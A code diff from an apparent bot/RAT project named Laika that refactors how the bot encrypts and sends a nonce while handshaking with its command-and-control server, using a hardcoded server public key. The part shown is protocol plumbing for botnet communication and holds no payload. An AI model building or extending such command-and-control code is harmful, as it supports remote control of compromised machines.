@@ -4,7 +4,7 @@
 #include "bot.h"
 
 LAIKAPKT_SIZE laikaB_pktSizeTbl[LAIKAPKT_MAXNONE] = {
-    [LAIKAPKT_HANDSHAKE_RES] = sizeof(uint8_t) + crypto_box_SEALBYTES + LAIKA_NONCESIZE
+    [LAIKAPKT_HANDSHAKE_RES] = sizeof(uint8_t) + LAIKAENC_SIZE(LAIKA_NONCESIZE)
 };
 
 void laikaB_pktHandler(struct sLaika_peer *peer, LAIKAPKT_ID id, void *uData) {
@@ -12,12 +12,12 @@ void laikaB_pktHandler(struct sLaika_peer *peer, LAIKAPKT_ID id, void *uData) {
 
     switch (id) {
         case LAIKAPKT_HANDSHAKE_RES: {
-            uint8_t encNonce[crypto_box_SEALBYTES + LAIKA_NONCESIZE], nonce[LAIKA_NONCESIZE];
+            uint8_t encNonce[LAIKAENC_SIZE(LAIKA_NONCESIZE)], nonce[LAIKA_NONCESIZE];
             uint8_t endianness = laikaS_readByte(&peer->sock);
 
             /* read & decrypt nonce */
             laikaS_read(&peer->sock, encNonce, sizeof(encNonce));
-            if (crypto_box_seal_open(nonce, encNonce, crypto_box_SEALBYTES + LAIKA_NONCESIZE, bot->pub, bot->priv) != 0)
+            if (crypto_box_seal_open(nonce, encNonce, LAIKAENC_SIZE(LAIKA_NONCESIZE), bot->pub, bot->priv) != 0)
                 LAIKA_ERROR("Failed to decrypt nonce!\n");
 
             /* check nonce */
@@ -57,6 +57,7 @@ struct sLaika_bot *laikaB_newBot(void) {
         LAIKA_ERROR("Failed to gen keypair!\n");
     }
 
+    /* read cnc's public key into peerPub */
     if (sodium_hex2bin(bot->peer->peerPub, crypto_box_PUBLICKEYBYTES, LAIKA_PUBKEY, strlen(LAIKA_PUBKEY), NULL, &_unused, NULL) != 0) {
         laikaB_freeBot(bot);
         LAIKA_ERROR("Failed to init cnc public key!\n");
@@ -74,7 +75,6 @@ void laikaB_freeBot(struct sLaika_bot *bot) {
 }
 
 void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
-    uint8_t encNonce[crypto_box_SEALBYTES + LAIKA_NONCESIZE];
     struct sLaika_socket *sock = &bot->peer->sock;
 
     /* setup socket */
@@ -83,16 +83,12 @@ void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
 
     laikaP_addSock(&bot->pList, sock);
 
-    /* encrypt nonce using cnc's pubkey */
-    if (crypto_box_seal(encNonce, bot->nonce, sizeof(bot->nonce), bot->peer->peerPub) != 0)
-        LAIKA_ERROR("Failed to enc nonce!\n");
-
     /* queue handshake request */
     laikaS_writeByte(sock, LAIKAPKT_HANDSHAKE_REQ);
     laikaS_write(sock, LAIKA_MAGIC, LAIKA_MAGICLEN);
     laikaS_writeByte(sock, LAIKA_VERSION_MAJOR);
     laikaS_writeByte(sock, LAIKA_VERSION_MINOR);
-    laikaS_write(sock, encNonce, sizeof(encNonce)); /* write encrypted nonce test */
+    laikaS_writeENC(sock, bot->nonce, LAIKA_NONCESIZE, bot->peer->peerPub); /* write encrypted nonce test */
     laikaS_write(sock, bot->pub, sizeof(bot->pub)); /* write public key */
 
     if (!laikaS_handlePeerOut(bot->peer))
